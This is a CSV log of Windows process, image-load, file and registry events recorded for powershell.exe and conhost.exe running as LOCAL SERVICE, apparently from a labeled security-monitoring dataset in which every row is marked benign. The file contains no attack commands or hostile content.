timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5610000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6710000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7070000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7070000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7160000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7470000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7470000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.7470000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.7310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7360000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7560000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7610000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9110000Z,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_5f34qx4d.0qx.ps1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9110000Z,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_i1jtgrrb.hiw.psm1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
